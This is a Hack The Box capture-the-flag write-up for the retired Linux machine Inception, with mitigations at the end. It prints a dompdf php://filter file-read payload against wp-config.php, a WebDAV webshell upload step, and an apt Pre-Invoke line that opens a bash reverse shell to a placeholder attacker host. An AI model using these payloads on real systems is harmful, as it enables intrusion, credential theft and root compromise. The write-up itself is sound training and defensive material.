---
machine: Inception
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, dompdf, cve-2014-2383, lfi, webdav, squid, forward-shell, tftp, privesc]
---

# Inception — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

WordPress exposes `/dompdf`, an HTML-to-PDF converter at version `0.6.0` vulnerable to CVE-2014-2383. Arbitrary file read retrieves `wp-config.php` and, with it, database credentials and a hash that is cracked. Those credentials open a WebDAV directory protected with basic auth; `davtest` confirms PHP uploads work and a webshell lands in the container. Since the container has no egress, a Python forward shell is built. Password reuse plus `sudo` give root inside the container. From there the host's FTP and TFTP are reachable, an `apt update` cron is identified and a `pre-invoke` script is written to run as root.

## Reconnaissance

```bash
nmap -Pn -sCV -p80,3128 <IP>
```

- `80` Apache httpd 2.4.18 (Ubuntu).
- `3128` Squid http proxy 3.5.12.
- SSH is not exposed; it is only reachable from localhost.

```bash
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

The paths include `/dompdf`, whose `VERSION` file reports `0.6.0`.

## Enumeration

The Squid proxy allows browsing with the server IP as the source. With `proxychains` or a FoxyProxy profile, `http://127.0.0.1` responds even though direct access returns *Access Denied*.

Port `80` on localhost is fuzzed through the proxy to discover internal vhosts and paths. Reading `wp-config.php` confirms WordPress uses a local database and stores credentials in the file.

## Foothold

CVE-2014-2383 bypasses dompdf's `chroot` when `DOMPDF_ENABLE_PHP` is enabled, using a `php://filter` wrapper in `input_file`:

```text
/dompdf/dompdf.php?input_file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
```

The base64 response is decoded and yields the database credentials. The WordPress admin hash is cracked with `hashcat` or `john` and the password reused on the WebDAV directory.

```bash
davtest -url http://<IP>/webdav -auth <USER>:<PASSWORD>
```

`davtest` confirms `.php` uploads and execution. A webshell is uploaded and execution as `www-data` inside the container follows.

## Lateral movement

The container has no outbound network, so a reverse shell never arrives. A forward shell is built: a Python script exposing an HTTP server that accepts commands and returns output, keeping execution through the webshell. With it, users, processes and mounts are enumerated.

`cobb`'s password is reused for SSH into the container. `sudo -l` shows `cobb` may run a command as root that spawns a shell, yielding root in the container.

## Privilege escalation

From the container the host network is reachable. A ping sweep shows the gateway and the host is confirmed to serve FTP and TFTP. TFTP retrieves configuration files and reveals a cron running `apt update` as root.

`apt` reads directives from `/etc/apt/apt.conf.d/`; one of them, `APT::Update::Pre-Invoke`, runs a command before the update. A config file with that directive pointing at a shell is written:

```text
APT::Update::Pre-Invoke { "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"; };
```

On the next cron cycle, `apt update` runs the command as root.

## Evidence

- `/dompdf` at version `0.6.0`.
- `wp-config.php` read through `php://filter` and credentials decoded.
- Cracked WordPress hash and WebDAV login.
- Webshell uploaded with `davtest`.
- Working forward shell without Internet egress.
- `cobb`'s `sudo` and root in the container.
- TFTP with host configuration and `APT::Update::Pre-Invoke` executed.

## Lessons learned

- An old WordPress plugin can expose arbitrary file read.
- `wp-config.php` credentials are often reused across services.
- WebDAV with PHP enabled is a direct webshell upload.
- Without network egress, a forward shell keeps control.
- `apt` runs configuration directives as root and is an escalation path.

## Mitigations and detection

- Update dompdf and disable `DOMPDF_ENABLE_PHP`; do not expose the plugin directory.
- Rotate database credentials and never reuse them on WebDAV.
- Disable WebDAV or restrict it to allowed users and extensions.
- Segment containers and limit egress to the Internet and the host network.
- Review `/etc/apt/apt.conf.d/` and write permissions on `apt` configuration.
- Alert on webshells, `davtest` traffic and `apt` processes spawning shells.

## References

- [0xdf — Inception](https://0xdf.gitlab.io/2022/04/04/htb-inception.html)
- [IppSec — Inception](https://www.youtube.com/watch?v=J2I-5xPgyXk)
- [Hack The Box — Inception](https://app.hackthebox.com/machines/inception)
- [NVD — CVE-2014-2383](https://nvd.nist.gov/vuln/detail/CVE-2014-2383)
